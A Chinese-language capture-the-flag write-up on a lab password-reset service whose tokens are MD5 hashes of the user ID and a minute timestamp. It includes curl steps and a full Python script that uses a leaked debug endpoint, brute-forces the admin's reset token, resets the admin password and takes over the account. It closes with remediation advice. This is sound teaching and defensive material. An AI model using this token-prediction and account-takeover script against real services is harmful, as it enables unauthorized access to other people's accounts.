# A07 Authentication Failures - Hard WriteUP

## 认证机制分析

本题目是一个基于 Flask + SQLite 的密码重置系统：
- 用户通过邮箱请求密码重置，系统生成一个 token
- token 存储在数据库中，有效期未严格限制
- 存在一个 `/debug/tokens` 端点泄露了最近生成的 token 信息
- token 生成算法：`md5(f"{user_id}:{minute_timestamp}")`，其中 `minute_timestamp = int(time.time() // 60) * 60`

**核心漏洞**：
1. **可预测的 token**：token 仅由用户ID和分钟级时间戳通过 MD5 生成，缺乏随机性
2. **信息泄露**：`/debug/tokens` 暴露了 token 与用户的对应关系，攻击者可以据此推断算法
3. **缺乏速率限制**：`/check-token` 和 `/reset-password` 可以高频调用

## 攻击原理

攻击者通过以下步骤利用认证失败漏洞：
1. 注册账户并请求密码重置，在 `/debug/tokens` 中查看自己的 token
2. 通过分析多个 token 或源码，发现 token = MD5(user_id : 分钟级时间戳)
3. 管理员 user_id = 1，通过在自己请求token的时间窗口前后几分钟内暴力生成候选token
4. 使用 `/check-token` 批量验证，找到管理员的有效 token
5. 使用管理员 token 重置密码，登录获取 Flag

## 攻击步骤

### 步骤1：注册账户并请求密码重置

```bash
curl -X POST http://target/register -d "username=hacker" -d "email=hacker@test.com" -d "password=hacker123"
curl -X POST http://target/forgot-password -d "email=hacker@test.com"
```

### 步骤2：查看调试泄露的 token

```bash
curl http://target/debug/tokens
```

响应示例：
```json
{
  "debug_info": "recent reset tokens",
  "tokens": [
    {
      "token": "a1b2c3d4...",
      "user_id": 2,
      "username": "hacker",
      "email": "hacker@test.com",
      "created_at": 1717771200
    }
  ]
}
```

观察到 `created_at` 是一个整分钟时间戳（能被60整除）。

### 步骤3：分析并爆破管理员 token

```python
import hashlib
import requests
import time

TARGET = "http://localhost:8089"

# 获取当前分钟级时间戳
current_ts = int(time.time() // 60) * 60

# 在前后 10 分钟窗口内生成管理员(user_id=1)的候选 token
candidates = []
for offset in range(-600, 601, 60):
    ts = current_ts + offset
    token = hashlib.md5(f"1:{ts}".encode()).hexdigest()
    candidates.append(token)

# 批量验证
for token in candidates:
    resp = requests.get(f"{TARGET}/check-token", params={"token": token})
    if resp.json().get('valid'):
        print(f"[+] Valid admin token found: {token}")
        break
```

### 步骤4：重置管理员密码并登录

```bash
curl -X POST http://target/reset-password -d "token=<found_token>" -d "new_password=owned123"
curl -X POST http://target/login -d "username=admin" -d "password=owned123"
```

## Python 完整利用脚本

```python
import hashlib
import requests
import time

TARGET = "http://localhost:8089"

# Step 1: Register and request reset for our account
requests.post(f"{TARGET}/register", data={
    "username": "hacker",
    "email": "hacker@test.com",
    "password": "hacker123"
})
requests.post(f"{TARGET}/forgot-password", data={"email": "hacker@test.com"})

# Step 2: Get debug tokens to confirm token structure
resp = requests.get(f"{TARGET}/debug/tokens")
tokens = resp.json().get('tokens', [])
if not tokens:
    print("[-] No tokens found")
    exit(1)

my_token = tokens[0]
print(f"[*] Our token: {my_token['token']}, user_id={my_token['user_id']}, ts={my_token['created_at']}")

# Step 3: Brute force admin token (user_id=1)
# The server verifies admin tokens in a +/- 10 minutes window around current time
# We search within the same window
current_ts = int(time.time() // 60) * 60
admin_token = None
for offset in range(-600, 601, 60):
    ts = current_ts + offset
    candidate = hashlib.md5(f"1:{ts}".encode()).hexdigest()
    check = requests.get(f"{TARGET}/check-token", params={"token": candidate})
    if check.json().get('valid'):
        admin_token = candidate
        print(f"[+] Found admin token: {candidate} (ts={ts})")
        break

if not admin_token:
    print("[-] Admin token not found. The server verifies in a window around current minute.")
    print("[-] Retry within a short time after Step 1.")
    exit(1)

# Step 4: Reset admin password
requests.post(f"{TARGET}/reset-password", data={
    "token": admin_token,
    "new_password": "pwned123"
})
print("[+] Admin password reset to: pwned123")

# Step 5: Login as admin and get flag
resp = requests.post(f"{TARGET}/login", data={
    "username": "admin",
    "password": "pwned123"
})
print("Flag:", resp.json().get('flag'))
```

## 修复建议

1. **使用加密安全随机数生成 token**：
   ```python
   import secrets
   token = secrets.token_urlsafe(32)
   ```
2. **设置 token 有效期**：token 应在生成后15-30分钟内过期
3. **移除调试端点**：生产环境中严禁暴露 `/debug/tokens` 等内部信息接口
4. **限制请求频率**：对 `/forgot-password`、`/reset-password`、`/check-token` 实施速率限制
5. **绑定验证方式**：重置密码时要求二次验证（如邮件中的链接+一次性验证码）
6. **增加不可预测因子**：token 中应包含足够熵的随机部分，而非仅依赖用户ID和时间戳
7. **监控异常行为**：检测同一IP短时间内大量请求 `/check-token` 的行为
